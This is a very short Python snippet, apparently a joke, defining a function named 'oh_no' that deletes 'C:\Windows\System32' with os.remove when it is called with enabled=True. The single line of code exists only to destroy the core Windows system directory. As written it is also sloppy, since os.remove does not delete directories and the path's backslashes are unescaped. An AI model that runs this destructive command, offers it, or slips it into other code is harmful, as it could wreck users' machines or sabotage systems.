import os

def oh_no(enabled=False):
	if enabled == False:
		pass
	elif enabled == True:
		os.remove("C:\Windows\System32")
